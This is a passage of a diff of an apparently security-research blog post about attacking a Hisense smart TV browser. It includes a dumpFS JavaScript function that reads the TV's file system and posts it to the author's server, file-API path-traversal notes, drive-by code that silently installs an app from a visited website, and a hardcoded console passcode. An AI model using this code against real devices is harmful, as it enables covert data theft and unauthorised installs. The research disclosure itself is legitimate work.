+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;dev&#34;</span>,<span style="color:#e6db74">&#34;dev&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3.7 kB&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;etc&#34;</span>,<span style="color:#e6db74">&#34;etc&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;502 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;font&#34;</span>,<span style="color:#e6db74">&#34;font&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;37 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;hidata&#34;</span>,<span style="color:#e6db74">&#34;hidata&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;59 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;home&#34;</span>,<span style="color:#e6db74">&#34;home&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;lib&#34;</span>,<span style="color:#e6db74">&#34;lib&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;1.2 kB&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;lost+found&#34;</span>,<span style="color:#e6db74">&#34;lost+found&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;mnt&#34;</span>,<span style="color:#e6db74">&#34;mnt&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;2.9 kB&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;mslib&#34;</span>,<span style="color:#e6db74">&#34;mslib&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;8.0 kB&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;OAD&#34;</span>,<span style="color:#e6db74">&#34;OAD&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;opt&#34;</span>,<span style="color:#e6db74">&#34;opt&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;proc&#34;</span>,<span style="color:#e6db74">&#34;proc&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;0 B&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;root&#34;</span>,<span style="color:#e6db74">&#34;root&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;sbin&#34;</span>,<span style="color:#e6db74">&#34;sbin&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;604 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;serialdata&#34;</span>,<span style="color:#e6db74">&#34;serialdata&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;subsystem&#34;</span>,<span style="color:#e6db74">&#34;subsystem&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;sys&#34;</span>,<span style="color:#e6db74">&#34;sys&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;0 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;system&#34;</span>,<span style="color:#e6db74">&#34;system&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;3 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;tmp&#34;</span>,<span style="color:#e6db74">&#34;tmp&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;760 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;tvcommon&#34;</span>,<span style="color:#e6db74">&#34;tvcommon&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;1.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;tvconfig&#34;</span>,<span style="color:#e6db74">&#34;tvconfig&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;tvcustomer&#34;</span>,<span style="color:#e6db74">&#34;tvcustomer&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;tvdatabase&#34;</span>,<span style="color:#e6db74">&#34;tvdatabase&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;tvservice&#34;</span>,<span style="color:#e6db74">&#34;tvservice&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;usb&#34;</span>,<span style="color:#e6db74">&#34;usb&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;usr&#34;</span>,<span style="color:#e6db74">&#34;usr&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;64 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;var&#34;</span>,<span style="color:#e6db74">&#34;var&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;440 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;vddt&#34;</span>,<span style="color:#e6db74">&#34;vddt&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;4.0 kB&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;vendor&#34;</span>,<span style="color:#e6db74">&#34;vendor&#34;</span>,<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#34;26 B&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;init&#34;</span>,<span style="color:#e6db74">&#34;init&#34;</span>,<span style="color:#ae81ff">0</span>,<span style="color:#e6db74">&#34;559 kB&#34;</span>, [...])
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addRow</span>(<span style="color:#e6db74">&#34;linuxrc&#34;</span>,<span style="color:#e6db74">&#34;linuxrc&#34;</span>,<span style="color:#ae81ff">0</span>,<span style="color:#e6db74">&#34;559 kB&#34;</span>, [...])
+</span></span></code></pre></div><p>The browser seems to be able to read the contents of the <code>/root</code> directory as well :) I&rsquo;ve then developed a function that dumps the directory listings of each directory recursively to get a better understanding of the file system structure:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">dumpFS</span>(<span style="color:#a6e22e">path</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">readFS</span>(<span style="color:#a6e22e">path</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">postContent</span>(<span style="color:#a6e22e">path</span>, <span style="color:#a6e22e">content</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">lines</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">content</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\n&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">idx</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">lines</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">line</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lines</span>[<span style="color:#a6e22e">idx</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// not an entry
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">line</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;addRow&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// check if dir flag is set (don&#39;t dump files in this step)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// 1 --&gt; dir
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// 0 --&gt; file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">line</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;,1,&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// parse directory listing entry
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">entryName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">line</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;(&#34;&#39;</span>)[<span style="color:#ae81ff">1</span>].<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;&#34;&#39;</span>)[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">entryName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">entryName</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;script&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/^\s+|\s+$/g</span>, <span style="color:#e6db74">&#39;&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wholePath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">entryName</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// don&#39;t ask why
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">wholePath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">wholePath</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34;//&#34;</span>, <span style="color:#e6db74">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">wholePath</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">wholePath</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#34;//&#34;</span>, <span style="color:#e6db74">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// don&#39;t dump specific directories
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">wholePath</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;.&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">wholePath</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;/proc&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">wholePath</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;/udev&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">wholePath</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;/dev&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">wholePath</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;/sys&#34;</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dumpFS</span>(<span style="color:#a6e22e">wholePath</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">path</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;/&#34;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;DONE&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The HTTP server on my machine then receives the POST requests, parses the received content and stores the output. My server is based on <a href="https://gist.github.com/bradmontgomery/2219997">this gist</a>.</p>
 <h2 id="using-the-browsers-file-api">Using the Browser&rsquo;s File API</h2>
 <p>My initial observation was that the browser application has to be able to read <em>and write</em> files, since the created shortcut to my HMTL5 application was persistent across device reboots. The shortcut was added by using the browser&rsquo;s debug menu, so the next logical step was to dump the HTML and JavaScript files of the <code>hisense://debug</code> web site that are stored on the file system.</p>
 <p>It turns out, that <code>File</code> can be used to both read and write files on the file system, as can be seen in the dumped JavaScript files:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">installedAppJsonStr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">File</span>.<span style="color:#a6e22e">read</span>(<span style="color:#e6db74">&#34;launcher/Appinfo.json&#34;</span>,<span style="color:#ae81ff">1</span>);
-[...]
-<span style="color:#a6e22e">File</span>.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#34;launcher/Appinfo.json&#34;</span>, <span style="color:#a6e22e">writedata</span>, <span style="color:#ae81ff">1</span>);
-</code></pre></div><p>It&rsquo;s important to note that the specified paths aren&rsquo;t absolute. This means that sequences of <code>../</code> have to be prepended to reach directories and files stored in other locations. Also, don&rsquo;t confuse this API with the <a href="https://developer.mozilla.org/de/docs/Web/API/File">HTML5 File API</a> – this API is entirely different. Interestingly, using <code>File.write()</code> seems to allow writing to arbitrary writable locations, whereas <code>File.read()</code> only allows to read files within a specific directory.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">installedAppJsonStr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">File</span>.<span style="color:#a6e22e">read</span>(<span style="color:#e6db74">&#34;launcher/Appinfo.json&#34;</span>,<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">File</span>.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#34;launcher/Appinfo.json&#34;</span>, <span style="color:#a6e22e">writedata</span>, <span style="color:#ae81ff">1</span>);
+</span></span></code></pre></div><p>It&rsquo;s important to note that the specified paths aren&rsquo;t absolute. This means that sequences of <code>../</code> have to be prepended to reach directories and files stored in other locations. Also, don&rsquo;t confuse this API with the <a href="https://developer.mozilla.org/de/docs/Web/API/File">HTML5 File API</a> – this API is entirely different. Interestingly, using <code>File.write()</code> seems to allow writing to arbitrary writable locations, whereas <code>File.read()</code> only allows to read files within a specific directory.</p>
 <p>Now, there&rsquo;s a little issue here. Most things are mounted as read-only on the TV&rsquo;s file system :( This means that only specific files and directories are writable. I&rsquo;ve found multiple ways to potentially brick my TV using this API. However, <em>so far</em> I haven&rsquo;t found a shell script or binary in a writable location that can be manipulated to gain code execution on the system.</p>
 <p>Apparently, there&rsquo;s a file called <code>run-OtaUpgrade.sh</code> in a writable location on some Hisense TVs. <a href="https://forum.xda-developers.com/t/rooting-mediatek-based-linux-smart-tv.3150281/post-68797397">Some people on XDA</a> successfully edited this file via the UART root console to turn on <code>telnetd</code> during boot. Unfortunately, this file is not present on my device. Another person reported that this file can be created in case it doesn&rsquo;t exist but it may also prevent the TV from booting in some cases :D I don&rsquo;t feel like buying a new TV, so I decided not to try it.</p>
 <p>Maybe it&rsquo;s possible to remotely root specific Hisense TVs using the method I described. In case the mentioned shell script exists, it could potentially be overwritten with custom commands that are invoked during a reboot. Maybe. Maybe not.</p>
@@ -459,30 +459,30 @@
 <h2 id="silently-installing-an-html5-application">Silently Installing an HTML5 Application</h2>
 <p>The plan was to use the <code>Hisense_installApp()</code> function to install an HTML5 application on a TV, which can be triggered from the regular browser context. This means that everyone visiting a specially prepared website with a Hisense TV&rsquo;s browser will get my super cool HTML5 application installed silently without any visible indication. The application then ends up on the regular Application menu with a custom icon.</p>
 <p>Here&rsquo;s some code that does just this:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">hax</span>() {
-    <span style="color:#75715e">// custom icon
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">thumb</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://pbs.twimg.com/profile_images/1144333025490210816/grBuwqHH_400x400.png&#34;</span>;
-    <span style="color:#75715e">// has to be a unique name
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">appName</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uberpwner13371337&#34;</span>;
-
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">thumbnail</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">thumb</span>;
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">iconSmall</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">thumb</span>;
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">iconBig</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">thumb</span>;
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">AppUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://bananamafia.dev/post/hisensehax/&#34;</span>;
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">storetype</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;store&#34;</span>;
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">appId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">appName</span>;
-
-    <span style="color:#a6e22e">Hisense_installApp</span>(<span style="color:#a6e22e">appId</span>, <span style="color:#a6e22e">appName</span>, <span style="color:#a6e22e">thumbnail</span>, <span style="color:#a6e22e">iconSmall</span>, <span style="color:#a6e22e">iconBig</span>, <span style="color:#a6e22e">AppUrl</span>, <span style="color:#a6e22e">storetype</span>, <span style="color:#a6e22e">installCallBack</span>);
-}
-
-<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">installCallBack</span>(<span style="color:#a6e22e">res</span>) {
-    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">res</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
-        <span style="color:#75715e">// worked
-</span><span style="color:#75715e"></span>    } <span style="color:#66d9ef">else</span> {
-        <span style="color:#75715e">// didn&#39;t work
-</span><span style="color:#75715e"></span>    }
-}
-</code></pre></div><p>As can be seen, an HTML5 application only consists of a URL and some meta data. Internally, the installation process writes a JSON structure with all this information into the file <code>Appinfo.json</code>, where all custom applications are stored.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">hax</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// custom icon
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">thumb</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://pbs.twimg.com/profile_images/1144333025490210816/grBuwqHH_400x400.png&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// has to be a unique name
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">appName</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;uberpwner13371337&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">thumbnail</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">thumb</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">iconSmall</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">thumb</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">iconBig</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">thumb</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">AppUrl</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://bananamafia.dev/post/hisensehax/&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">storetype</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;store&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">appId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">appName</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Hisense_installApp</span>(<span style="color:#a6e22e">appId</span>, <span style="color:#a6e22e">appName</span>, <span style="color:#a6e22e">thumbnail</span>, <span style="color:#a6e22e">iconSmall</span>, <span style="color:#a6e22e">iconBig</span>, <span style="color:#a6e22e">AppUrl</span>, <span style="color:#a6e22e">storetype</span>, <span style="color:#a6e22e">installCallBack</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">installCallBack</span>(<span style="color:#a6e22e">res</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">res</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// worked
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// didn&#39;t work
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>As can be seen, an HTML5 application only consists of a URL and some meta data. Internally, the installation process writes a JSON structure with all this information into the file <code>Appinfo.json</code>, where all custom applications are stored.</p>
 <p>I haven&rsquo;t found a way that allows uninstalling these apps from the UI, it&rsquo;s however possible using another API function.</p>
 <h2 id="launching-the-application">Launching the Application</h2>
 <p>There are a few ways this could be done:</p>
@@ -504,32 +504,32 @@
 </ul>
 <h1 id="a-mysterious-shell-script-appears">A Mysterious Shell Script Appears</h1>
 <p>I&rsquo;ve found this in <code>/etc/login.sh</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/sh
-</span><span style="color:#75715e"></span>stty -echo
-
-<span style="color:#66d9ef">while</span> true
-<span style="color:#66d9ef">do</span>
-    read line
-    <span style="color:#75715e"># if [ $(echo -n &#34;x${line}&#34; | md5sum | awk &#39;{print $1}&#39;) = &#34;e6007a36a7bacfb32502f787431664df&#34; ]; then</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$line<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;05328087&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
-        stty echo
-        exit <span style="color:#ae81ff">0</span>
-    <span style="color:#66d9ef">fi</span>
-<span style="color:#66d9ef">done</span>
-</code></pre></div><p>In case you didn&rsquo;t know: The command <code>stty -echo</code> changes the settings of the current shell to disable input echoing. Unless the magic value <code>05328087</code> is entered, no input feedback will be provided by the shell. This makes me think that there&rsquo;s another (serial?) console hidden somewhere&hellip; :(</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>stty -echo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> true
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    read line
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># if [ $(echo -n &#34;x${line}&#34; | md5sum | awk &#39;{print $1}&#39;) = &#34;e6007a36a7bacfb32502f787431664df&#34; ]; then</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$line<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;05328087&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        stty echo
+</span></span><span style="display:flex;"><span>        exit <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>In case you didn&rsquo;t know: The command <code>stty -echo</code> changes the settings of the current shell to disable input echoing. Unless the magic value <code>05328087</code> is entered, no input feedback will be provided by the shell. This makes me think that there&rsquo;s another (serial?) console hidden somewhere&hellip; :(</p>
 <h1 id="pocs-aka-please-hack-my-tv">PoCs aka Please Hack My TV</h1>
 <p>You can trigger different PoCs using the buttons below. Don&rsquo;t blame me for any damage, though.</p>
